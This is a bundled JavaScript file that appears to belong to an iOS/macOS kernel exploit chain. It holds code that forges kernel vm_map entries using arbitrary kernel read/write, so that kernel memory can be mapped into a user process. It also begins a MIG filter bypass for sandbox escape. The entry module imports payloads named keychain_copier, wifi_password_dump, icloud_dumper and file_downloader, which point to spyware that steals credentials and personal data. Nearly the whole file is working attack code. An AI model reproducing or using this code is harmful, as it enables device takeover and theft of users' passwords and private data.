				if (address < links.end)
				{
					foundEntry = curPtr;
					//console.log(TAG,`Found:${Utils.hex(curPtr)}`);
					break;
				}
	
				let rbeRight = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(rbEntry +  libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().rbeRight);
				rbEntry = rbeRight;
				//prev = curPtr;
			}
			else
			{
				let rbeLeft = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(rbEntry +  libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().rbeLeft);
				rbEntry = rbeLeft;
			}
		}
		return foundEntry;
	}

	static mapRemotePage(vmMap, address)
	{
		//console.log(TAG, `Map remote address: ${Utils.hex(address)}`);

		let vmObject = VM.getObject(vmMap, address);
		//LOG("vmObject: %llx (objectOffset=%llx, entryOffset=%llx)",
		//	vmObject.address,
		//	vmObject.objectOffset,
		//	vmObject.entryOffset);
		
		if (!vmObject.address)
			return null;

		let shmem = VM.createShmemWithVmObject(vmObject);
		//LOG("shmem: port=%x, address=%llx", shmem.port, shmem.remoteAddress);

		return shmem;
	}

	static getObject(map, address)
	{
		let VMObjectBuff = new ArrayBuffer(SIZE_VMOBJECT);
		let vmObject = new _VMObject__WEBPACK_IMPORTED_MODULE_5__["default"](VMObjectBuff);
		let entryAddr = this.#vm_getEntry(map, address);
		if (!entryAddr)
			return vmObject;

		let entryBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].readBuff(entryAddr, VM_MAP_ENTRY_SIZE);
		let entryUintArr = new Uint8Array(entryBuff);
		let entry = new _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__.vm_map_entry(entryUintArr);
		//console.log(TAG, `entry: addr=${Utils.hex(entryAddr)}, is_sub_map=${entry.is_sub_map}, vme_object_packed=${Utils.hex(entry.vme_object)}`);

		let paramsBuff = new ArrayBuffer(VMPackingSize);
		let params = new _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__["default"](paramsBuff);
		params.vmpp_base = this.#VM_PAGE_PACKED_PTR_BASE();
		params.vmpp_bits = VM_PAGE_PACKED_PTR_BITS;
		params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
		params.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(params);
		let vmeObject = this.#VM_UNPACK_POINTER(entry.vme_object, params);
		//console.log(TAG, `vme object: ${Utils.hex(vmeObject)}`);

		let objectOffs = this.#VME_OFFSET(entry);
		let entryOffs = address - entry.links.start + objectOffs;
		
		//console.log(TAG, `object offset: ${Utils.hex(objectOffs)}`);
		//console.log(TAG, `entry offset: ${Utils.hex(entryOffs)}`);

		vmObject.vmAddress = address;
		vmObject.address = BigInt(vmeObject);
		vmObject.objectOffset = BigInt(objectOffs);
		vmObject.entryOffset = BigInt(entryOffs);
		return vmObject;
	}

	static createShmemWithVmObject(object)
	{
		//console.log(TAG,`Inside createShmem with addr to read:${Utils.hex(object.address)}`);
		let shmemBuff = new ArrayBuffer(VMShmem_SIZE);
		let shmem = new _VMShmem__WEBPACK_IMPORTED_MODULE_6__["default"](shmemBuff);
		let size = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(object.address + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().vouSize);
		size = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].round_page(size);
		
		//console.log(TAG,`vm object size:${Utils.hex(size)}`);
		
		let localAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		let roundedSize = this.#round_page_kernel(size);
		let ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_vm_allocate",0x203n, localAddr, roundedSize, VM_FLAGS_ANYWHERE);
		if (ret != 0)
		{
			console.log(TAG,`mach_vm_allocate():${ret}`);
			return shmem;
		}
		localAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(localAddr);
		//console.log(TAG,`mach_vm_allocate:${Utils.hex(roundedSize)} localAddr:${Utils.hex(localAddr)}`);
		/*
		let memory_object = new_bigint();
		ret = Native.callSymbol("mach_make_memory_entry_64",
			0x203n,
			get_bigint_addr(roundedSize),
			localAddr,
			this.VM_PROT_READ | this.VM_PROT_WRITE,
			get_bigint_addr(memory_object),
			0n);
		let resBuff = Native.read(get_bigint_addr(memory_object),Utils.UINT32_SIZE);
		let resView = new DataView(resBuff);
		let port = resView.getUint32(0,true);
		*/
		
		let memory_object = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x500n;
		let roundedSizePtr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem + 0x1000n;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write64(roundedSizePtr, roundedSize);

		ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_make_memory_entry_64",
			0x203n,
			roundedSizePtr,
			localAddr,
			this.VM_PROT_READ | this.VM_PROT_WRITE,
			memory_object,
			0n);
		let port = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read32(memory_object);
		//let port = Native.callSymbol("wrapper_mach_make_memory_entry_64",roundedSize,localAddr);
		//console.log(TAG,`mach_make_memory_entry_64():${Utils.hex(port)}`);
		let shmemNamedEntry = _Task__WEBPACK_IMPORTED_MODULE_4__["default"].getPortKObject(BigInt(port));
		//console.log(TAG,`shmem named entry:${Utils.hex(shmemNamedEntry)}`);
		let shmemVMCopyAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(shmemNamedEntry + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().backingCopy);
		//console.log(TAG,`shmem named entry VM copy addr:${Utils.hex(shmemVMCopyAddr)}`);
		let nextAddr = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read64(shmemVMCopyAddr + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().next);
		//console.log(TAG,`next addr:${Utils.hex(nextAddr)}`);
		let entryBuff = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].readBuff(nextAddr, VM_MAP_ENTRY_SIZE);
		let entryArr = new Uint8Array(entryBuff);
		let entry = new _VmMapEntry__WEBPACK_IMPORTED_MODULE_3__.vm_map_entry(entryArr);
		//console.log(TAG,`entry: vme_kernel_object=${Utils.hex(entry.vme_kernel_object)}, is_sub_map=${Utils.hex(entry.is_sub_map)}`);
		//console.log(TAG,`entry: is_sub_map=${Utils.hex(entry.is_sub_map)}`);
		if (entry.vme_kernel_object || entry.is_sub_map || false) // vme_kernel_object struct is not implemented
		{
			console.log(TAG,`Entry cannot be a submap`);
			return shmem;
		}
		let paramsBuff = new ArrayBuffer(VMPackingSize);
		let params = new _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__["default"](paramsBuff);
		params.vmpp_base = this.#VM_PAGE_PACKED_PTR_BASE();
		params.vmpp_bits = VM_PAGE_PACKED_PTR_BITS;
		params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
		params.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(params);
		let packedPointer = this.#VM_PACK_POINTER(object.address, params);
		//console.log(TAG,`packedPointer:${Utils.hex(packedPointer)}`);
		let refCount = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].read32(object.address + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().refCount);
		//console.log(TAG,`vm object ref count:${Utils.hex(refCount)}`);
		refCount++;
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].write32(object.address + libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].offsets().refCount, refCount);
		entry.vme_object = Number(packedPointer);
		entry.vme_offset = object.objectOffset;
		//write(nextAddr, &entry, sizeof(entry));
		// write dedicate write in order to avoid zone panic with bigger 0x20 elements size
		let entryResWrite = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write(entryResWrite,entryArr.buffer);
		//Utils.printArrayBufferInChunks(entryArr.buffer);
		libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_0__["default"].writeZoneElement(nextAddr, entryResWrite, VM_MAP_ENTRY_SIZE);
		//console.log(TAG,`After write zone element`);
		//let mappedAddr = Native.callSymbol("malloc",roundedSize * 4n);
		//let mappedAddr = new_bigint();
		let mappedAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].mem;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].write64(mappedAddr, 0x1337n);
		//let mach_vm_map_func = Native.dlsym("mach_vm_map");
		//console.log(TAG,`mach_vm_map:${Utils.hex(mach_vm_map_func)} with object.entryOffset:${Utils.hex(object.entryOffset)}`);
		//ret = fcall(mach_vm_map_func,0x203n,get_bigint_addr(mappedAddr),0x4000n,0n,1n,BigInt(port),BigInt(object.entryOffset),0n,(this.VM_PROT_ALL | this.VM_PROT_IS_MASK) | ((this.VM_PROT_ALL | this.VM_PROT_IS_MASK) << 32n),this.VM_INHERIT_NONE);
		ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_vm_map",0x203n,mappedAddr,0x4000n,0n,1n,BigInt(port),BigInt(object.entryOffset),0n,(this.VM_PROT_ALL | this.VM_PROT_IS_MASK) | ((this.VM_PROT_ALL | this.VM_PROT_IS_MASK) << 32n),this.VM_INHERIT_NONE);
		//console.log(TAG,`ret:${ret}`);
		mappedAddr = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].read64(mappedAddr);
		//console.log(TAG,`mach_vm_map():${Utils.hex(ret)}, mappedAddr=${Utils.hex(mappedAddr)}`);
		if(ret != 0)
		{
			console.log(TAG,'failed on mach_vm_map');
			mappedAddr = 0n;
		}

		ret = libs_Chain_Native__WEBPACK_IMPORTED_MODULE_1__["default"].callSymbol("mach_vm_deallocate", 0x203, localAddr, roundedSize);
		if (ret != 0) {
			console.log(TAG, "mach_vm_deallocate: " + ret);
		}

		//let mappedAddr = Native.callSymbol("wrapper_mach_vm_map",port,object.entryOffset);
		//console.log(TAG,`mappedAddr:${Utils.hex(mappedAddr)}`);
		shmem.port = BigInt(port);
		shmem.remoteAddress = object.vmAddress;
		shmem.localAddress = mappedAddr;
		return shmem;
	}
	
	static mocker(addrUnpack,addrPack)
	{
		let paramsBuff = new ArrayBuffer(VMPackingSize);
		let params = new _VmPackingParams__WEBPACK_IMPORTED_MODULE_7__["default"](paramsBuff);
		params.vmpp_base = this.#VM_PAGE_PACKED_PTR_BASE();
		params.vmpp_bits = VM_PAGE_PACKED_PTR_BITS;
		params.vmpp_shift = VM_PAGE_PACKED_PTR_SHIFT;
		params.vmpp_base_relative = this.#VM_PACKING_IS_BASE_RELATIVE(params);
		let vmeObject = this.#VM_UNPACK_POINTER(addrUnpack, params);
		//console.log(TAG,`vmeObjectUnpack:${Utils.hex(vmeObject)}`);
		vmeObject = this.#VM_PACK_POINTER(addrPack,params);
		//console.log(TAG,`vmeObjectpack:${Utils.hex(vmeObject)}`);
	}
}


/***/ }),

/***/ "./src/libs/TaskRop/VMObject.js":
/*!**************************************!*\
  !*** ./src/libs/TaskRop/VMObject.js ***!
  \**************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ VMObject)
/* harmony export */ });
class VMObject
{
	#buffer;
	#dataView;
	constructor(buffer)
	{
		this.#buffer = buffer;
		this.#dataView = new DataView(this.#buffer);
	}
	get vmAddress()
	{
		return this.#dataView.getBigUint64(0,true);
	}
	set vmAddress(value)
	{
		this.#dataView.setBigUint64(0,value,true);
	}
	get address()
	{
		return this.#dataView.getBigUint64(8,true);
	}
	set address(value)
	{
		this.#dataView.setBigUint64(8,value,true);
	}
	get objectOffset()
	{
		return this.#dataView.getBigUint64(16,true);
	}
	set objectOffset(value)
	{
		this.#dataView.setBigUint64(16,value,true);
	}
	get entryOffset()
	{
		return this.#dataView.getBigUint64(24,true);
	}
	set entryOffset(value)
	{
		this.#dataView.setBigUint64(24,value,true);
	}
}

/***/ }),

/***/ "./src/libs/TaskRop/VMShmem.js":
/*!*************************************!*\
  !*** ./src/libs/TaskRop/VMShmem.js ***!
  \*************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ VMShmem)
/* harmony export */ });
class VMShmem 
{
	#buffer;
	#dataView;
	constructor(buffer)
	{
		this.#buffer = buffer;
		this.#dataView = new DataView(this.#buffer);
	}
	get port()
	{
		return this.#dataView.getBigUint64(0,true);
	}
	set port(value)
	{
		this.#dataView.setBigUint64(0,value,true);
	}
	get remoteAddress()
	{
		return this.#dataView.getBigUint64(8,true);
	}
	set remoteAddress(value)
	{
		this.#dataView.setBigUint64(8,value,true);
	}
	get localAddress()
	{
		return this.#dataView.getBigUint64(16,true);
	}
	set localAddress(value)
	{
		this.#dataView.setBigUint64(16,value,true);
	}
}

/***/ }),

/***/ "./src/libs/TaskRop/VmMapEntry.js":
/*!****************************************!*\
  !*** ./src/libs/TaskRop/VmMapEntry.js ***!
  \****************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (__WEBPACK_DEFAULT_EXPORT__),
/* harmony export */   vm_map_entry: () => (/* binding */ vm_map_entry),
/* harmony export */   vm_map_links: () => (/* binding */ vm_map_links)
/* harmony export */ });
class vm_map_links {
    #__mem;
    #__view;
    #__addr;
    #__off;
    constructor(mem=undefined, off=0) {
        this.#__mem = mem ? mem : new Uint8Array(0x20);
        this.#__view = new DataView(this.#__mem.buffer);
        this.#__off = off;
        this.sizeof = this.#__mem.length;
    }
    get addr() { if (!this.#__addr) { this.#__addr = get_buffer_addr(this.#__mem).add(this.#__off); } return this.#__addr; }
    /* previous entry */
    get prev() { return this.#__view.getBigUint64(this.#__off, true); }
    set prev(val) { this.#__view.setBigUint64(this.#__off, val, true); }
    /* next entry */
    get next() { return this.#__view.getBigUint64(this.#__off+0x8, true); }
    set next(val) { this.#__view.setBigUint64(this.#__off+0x8, val, true); }
    /* start address */
    get start() { return this.#__view.getBigUint64(this.#__off+0x10, true); }
    set start(val) { this.#__view.setBigUint64(this.#__off+0x10, val, true); }
    /* end address */
    get end() { return this.#__view.getBigUint64(this.#__off+0x18, true); }
    set end(val) { this.#__view.setBigUint64(this.#__off+0x18, val, true); }
};

class vm_map_store {
    #__mem;
    #__view;
    #__addr;
    #__off;
    constructor(mem=undefined, off=0) {
        this.#__mem = mem ? mem : new Uint8Array(0x18);
        this.#__view = new DataView(this.#__mem.buffer);
        this.#__off = off;
        this.sizeof = this.#__mem.length;
    }
    get addr() { if (!this.#__addr) { this.#__addr = get_buffer_addr(this.#__mem).add(this.#__off); } return this.#__addr; }
    /* left element */
    get rbe_left() { return this.#__view.getBigUint64(this.#__off, true); }
    set rbe_left(val) { this.#__view.setBigUint64(this.#__off, val, true); }
    /* right element */
    get rbe_right() { return this.#__view.getBigUint64(this.#__off+0x8, true); }
    set rbe_right(val) { this.#__view.setBigUint64(this.#__off+0x8, val, true); }
    /* parent element */
    get rbe_parent() { return this.#__view.getBigUint64(this.#__off+0x10, true); }
    set rbe_parent(val) { this.#__view.setBigUint64(this.#__off+0x10, val, true); }
};

class vm_map_entry {
    #__mem;
    #__view;
    #__addr;
    #__off;
    constructor(mem=undefined, off=0) {
        this.#__mem = mem ? mem : new Uint8Array(0x50);
        this.#__view = new DataView(this.#__mem.buffer);
        this.#__off = off;
        this.sizeof = this.#__mem.length;
        this.links = new vm_map_links(this.#__mem, this.#__off);
        this.store = new vm_map_store(this.#__mem, this.#__off+0x20);
    }
    get addr() { if (!this.#__addr) { this.#__addr = get_buffer_addr(this.#__mem).add(this.#__off); } return this.#__addr; }

    // Union field 1
    get vme_object_value() { return this.#__view.getBigUint64(this.#__off+0x38, true); }
    set vme_object_value(val) { this.#__view.setBigUint64(this.#__off+0x38, val, true); }

    // Union field 2
    get vme_atomic() { return this.#__view.getUint8(this.#__off+0x38, true) & 1; }
    set vme_atomic(val) {
        let cur = this.#__view.getUint8(this.#__off+0x38, true) & 0xfe;
        this.#__view.setUint8(this.#__off+0x38, cur + (val & 1), true);
    }
    get is_sub_map() { return (this.#__view.getUint8(this.#__off+0x38, true) & 2) >> 1; }
    set is_sub_map(val) {
        let cur = this.#__view.getUint8(this.#__off+0x38, true) & 0xfd;
        this.#__view.setUint8(this.#__off+0x38, cur + ((val & 1) << 1), true);
    }
    get vme_submap() { return this.#__view.getBigUint64(this.#__off+0x38, true) >> 2n; }
    set vme_submap(val) {
        let cur = this.#__view.getBigUint64(this.#__off+0x38, true) & 3n;
        this.#__view.setBigUint64(this.#__off+0x38, cur + ((val & 0x3fffffffffffffffn) << 2n), true);
    }

    // Union field 3
    get vme_ctx_atomic() { return this.#__view.getUint8(this.#__off+0x38, true) & 1; }
    set vme_ctx_atomic(val) {
        let cur = this.#__view.getUint8(this.#__off+0x38, true) & 0xfe;
        this.#__view.setUint8(this.#__off+0x38, cur + (val & 1), true);
    }
    get vme_ctx_is_sub_map() { return (this.#__view.getUint8(this.#__off+0x38, true) & 2) >> 1; }
    set vme_ctx_is_sub_map(val) {
        let cur = this.#__view.getUint8(this.#__off+0x38, true) & 0xfd;
        this.#__view.setUint8(this.#__off+0x38, cur + ((val & 1) << 1), true);
    }
    get vme_context() { return this.#__view.getUint32(this.#__off+0x38, true) >> 2; }
    set vme_context(val) {
        let cur = this.#__view.getUint32(this.#__off+0x38, true) & 2;
        this.#__view.setUint32(this.#__off+0x38, cur + (val << 2), true);
    }
    get vme_object() { return this.#__view.getUint32(this.#__off+0x3c, true); }
    set vme_object(val) { this.#__view.setUint32(this.#__off+0x3c, val, true); }

    // vme_alias:12,               /* entry VM tag */
    // vme_offset:52,              /* offset into object */
    get vme_offset() { return this.#__view.getBigUint64(this.#__off+0x40, true) >> 12n;  }
    set vme_offset(val) {
        let cur = this.#__view.getBigUint64(this.#__off+0x40, true) & 0xfffn;
        this.#__view.setBigUint64(this.#__off+0x40, cur + (val << 12n), true);
    }
    // is_shared:1,                /* region is shared */
    // __unused1:1,
    // in_transition:1,            /* Entry being changed */
    // needs_wakeup:1,             /* Waiters on in_transition */
    // behavior:2,                 /* user paging behavior hint */
    // needs_copy:1,               /* object need to be copied? */
    // protection:3,               /* protection code */
    // used_for_tpro:1,
    // max_protection:4,           /* maximum protection, bit3=UEXEC */
    // inheritance:2,              /* inheritance */
    // use_pmap:1,
    // no_cache:1,                 /* should new pages be cached? */
    // vme_permanent:1,            /* mapping can not be removed */
    // superpage_size:1,           /* use superpages of a certain size */
    // map_aligned:1,              /* align to map's page size */
    // zero_wired_pages:1,
    // used_for_jit:1,
    // csm_associated:1,           /* code signing monitor will validate */
    // iokit_acct:1,
    // vme_resilient_codesign:1,
    // vme_resilient_media:1,
    // vme_xnu_user_debug:1,
    // vme_no_copy_on_read:1,
    // translated_allow_execute:1, /* execute in translated processes */
    // vme_kernel_object:1;        /* vme_object is kernel_object */

    /* can be paged if = 0 */
    get wired_count() { return this.#__view.getUint16(this.#__off+0x4c, true); }
    set wired_count(val) { this.#__view.setUint16(this.#__off+0x4c, val, true); }
    /* for vm_wire */
    get user_wired_count() { return this.#__view.getUint16(this.#__off+0x4e, true); }
    set user_wired_count(val) { this.#__view.setUint16(this.#__off+0x4e, val, true); }
};
/* harmony default export */ const __WEBPACK_DEFAULT_EXPORT__ = ({vm_map_entry,vm_map_links,vm_map_store});


/***/ }),

/***/ "./src/libs/TaskRop/VmPackingParams.js":
/*!*********************************************!*\
  !*** ./src/libs/TaskRop/VmPackingParams.js ***!
  \*********************************************/
/***/ ((__unused_webpack_module, __webpack_exports__, __webpack_require__) => {

__webpack_require__.r(__webpack_exports__);
/* harmony export */ __webpack_require__.d(__webpack_exports__, {
/* harmony export */   "default": () => (/* binding */ VmPackingParams)
/* harmony export */ });
class VmPackingParams
{
	#buffer;
	#dataView;
	constructor(buffer)
	{
		this.#buffer = buffer;
		this.#dataView = new DataView(this.#buffer);
	}
	get vmpp_base()
	{
		return this.#dataView.getBigUint64(0,true);
	}
	set vmpp_base(value)
	{
		this.#dataView.setBigUint64(0,value,true);
	}
	get vmpp_bits()
	{
		return this.#dataView.getUint8(8,true);
	}
	set vmpp_bits(value)
	{
		this.#dataView.setUint8(8,value,true);
	}
	get vmpp_shift()
	{
		return this.#dataView.getUint8(9,true);
	}
	set vmpp_shift(value)
	{
		this.#dataView.setUint8(9,value,true);
	}
	get vmpp_base_relative()
	{
		return this.#dataView.getUint8(10,true);
	}
	set vmpp_base_relative(value)
	{
		this.#dataView.setUint8(10,value,true);
	}
}

/***/ })

/******/ 	});
/************************************************************************/
/******/ 	// The module cache
/******/ 	var __webpack_module_cache__ = {};
/******/ 	
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/ 		// Check if module is in cache
/******/ 		var cachedModule = __webpack_module_cache__[moduleId];
/******/ 		if (cachedModule !== undefined) {
/******/ 			return cachedModule.exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = __webpack_module_cache__[moduleId] = {
/******/ 			// no module.id needed
/******/ 			// no module.loaded needed
/******/ 			exports: {}
/******/ 		};
/******/ 	
/******/ 		// Execute the module function
/******/ 		__webpack_modules__[moduleId](module, module.exports, __webpack_require__);
/******/ 	
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/ 	
/************************************************************************/
/******/ 	/* webpack/runtime/define property getters */
/******/ 	(() => {
/******/ 		// define getter functions for harmony exports
/******/ 		__webpack_require__.d = (exports, definition) => {
/******/ 			for(var key in definition) {
/******/ 				if(__webpack_require__.o(definition, key) && !__webpack_require__.o(exports, key)) {
/******/ 					Object.defineProperty(exports, key, { enumerable: true, get: definition[key] });
/******/ 				}
/******/ 			}
/******/ 		};
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/hasOwnProperty shorthand */
/******/ 	(() => {
/******/ 		__webpack_require__.o = (obj, prop) => (Object.prototype.hasOwnProperty.call(obj, prop))
/******/ 	})();
/******/ 	
/******/ 	/* webpack/runtime/make namespace object */
/******/ 	(() => {
/******/ 		// define __esModule on exports
/******/ 		__webpack_require__.r = (exports) => {
/******/ 			if(typeof Symbol !== 'undefined' && Symbol.toStringTag) {
/******/ 				Object.defineProperty(exports, Symbol.toStringTag, { value: 'Module' });
/******/ 			}
/******/ 			Object.defineProperty(exports, '__esModule', { value: true });
/******/ 		};
/******/ 	})();
/******/ 	
/************************************************************************/
var __webpack_exports__ = {};
// This entry needs to be wrapped in an IIFE because it needs to be isolated against other modules in the chunk.
(() => {
/*!*********************!*\
  !*** ./src/main.js ***!
  \*********************/
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! libs/Chain/Native */ "./src/libs/Chain/Native.js");
/* harmony import */ var libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! libs/Chain/Chain */ "./src/libs/Chain/Chain.js");
/* harmony import */ var libs_TaskRop_TaskRop__WEBPACK_IMPORTED_MODULE_2__ = __webpack_require__(/*! libs/TaskRop/TaskRop */ "./src/libs/TaskRop/TaskRop.js");
/* harmony import */ var libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_3__ = __webpack_require__(/*! libs/TaskRop/Task */ "./src/libs/TaskRop/Task.js");
/* harmony import */ var libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__ = __webpack_require__(/*! libs/TaskRop/Sandbox */ "./src/libs/TaskRop/Sandbox.js");
/* harmony import */ var libs_JSUtils_Utils__WEBPACK_IMPORTED_MODULE_5__ = __webpack_require__(/*! libs/JSUtils/Utils */ "./src/libs/JSUtils/Utils.js");
/* harmony import */ var _InjectJS__WEBPACK_IMPORTED_MODULE_6__ = __webpack_require__(/*! ./InjectJS */ "./src/InjectJS.js");
/* harmony import */ var libs_Driver_Driver__WEBPACK_IMPORTED_MODULE_7__ = __webpack_require__(/*! libs/Driver/Driver */ "./src/libs/Driver/Driver.js");
/* harmony import */ var libs_TaskRop_RemoteCall__WEBPACK_IMPORTED_MODULE_8__ = __webpack_require__(/*! libs/TaskRop/RemoteCall */ "./src/libs/TaskRop/RemoteCall.js");
/* harmony import */ var _raw_loader_dist_MigFilterBypassThread_js__WEBPACK_IMPORTED_MODULE_9__ = __webpack_require__(/*! !raw-loader!../dist/MigFilterBypassThread.js */ "./node_modules/raw-loader/dist/cjs.js!./dist/MigFilterBypassThread.js");
/* harmony import */ var _raw_loader_loader_js__WEBPACK_IMPORTED_MODULE_10__ = __webpack_require__(/*! !raw-loader!loader.js */ "./node_modules/raw-loader/dist/cjs.js!./src/loader.js");
/* harmony import */ var _raw_loader_file_downloader_js__WEBPACK_IMPORTED_MODULE_11__ = __webpack_require__(/*! !raw-loader!file_downloader.js */ "./node_modules/raw-loader/dist/cjs.js!./src/file_downloader.js");
/* harmony import */ var _raw_loader_keychain_copier_js__WEBPACK_IMPORTED_MODULE_12__ = __webpack_require__(/*! !raw-loader!keychain_copier.js */ "./node_modules/raw-loader/dist/cjs.js!./src/keychain_copier.js");
/* harmony import */ var _raw_loader_wifi_password_dump_js__WEBPACK_IMPORTED_MODULE_13__ = __webpack_require__(/*! !raw-loader!wifi_password_dump.js */ "./node_modules/raw-loader/dist/cjs.js!./src/wifi_password_dump.js");
/* harmony import */ var _raw_loader_wifi_password_securityd_js__WEBPACK_IMPORTED_MODULE_14__ = __webpack_require__(/*! !raw-loader!wifi_password_securityd.js */ "./node_modules/raw-loader/dist/cjs.js!./src/wifi_password_securityd.js");
/* harmony import */ var _raw_loader_icloud_dumper_js__WEBPACK_IMPORTED_MODULE_15__ = __webpack_require__(/*! !raw-loader!icloud_dumper.js */ "./node_modules/raw-loader/dist/cjs.js!./src/icloud_dumper.js");

















//import KeychainDumpCode from '!raw-loader!keychain_dump.js'

class MigFilterBypass {

	#running;
	#sharedMem;
	#runFlagPtr;
	#isRunningPtr;
	#monitorThread1Ptr;
	#monitorThread2Ptr;
	#mutexPtr;

	constructor(mutexPtr) {
		this.#mutexPtr = mutexPtr;
		this.#running = false;
		this.#sharedMem = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("calloc", 1, 0x100));
		this.#runFlagPtr = this.#sharedMem;
		this.#isRunningPtr = this.#sharedMem + 0x4n;
		this.#monitorThread1Ptr = this.#sharedMem + 0x8n;
		this.#monitorThread2Ptr = this.#sharedMem + 0x10n;
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#runFlagPtr, 2);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write32(this.#isRunningPtr, 0);
	}

	start() {
		if (this.#running)
			return;

		let threadSelf = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("mach_thread_self"));
		let threadSelfAddr = BigInt(libs_TaskRop_Task__WEBPACK_IMPORTED_MODULE_3__["default"].getPortKObject(threadSelf));


		let threadMem = BigInt(libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].callSymbol("calloc", 1, 0x400));
		let kernelRW = libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].transferRW();
		let kernelBase = BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].getKernelBase());
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem, BigInt(kernelRW.controlSocket));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x8n, BigInt(kernelRW.rwSocket));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x10n, kernelBase);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x18n, threadSelfAddr);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x20n, this.#runFlagPtr);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x28n, this.#isRunningPtr);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x30n, this.#mutexPtr);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x38n, BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().migLock));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x40n, BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().migSbxMsg));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x48n, BigInt(libs_Chain_Chain__WEBPACK_IMPORTED_MODULE_1__["default"].offsets().migKernelStackLR));
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x50n, this.#monitorThread1Ptr);
		libs_Chain_Native__WEBPACK_IMPORTED_MODULE_0__["default"].write64(threadMem + 0x58n, this.#monitorThread2Ptr);
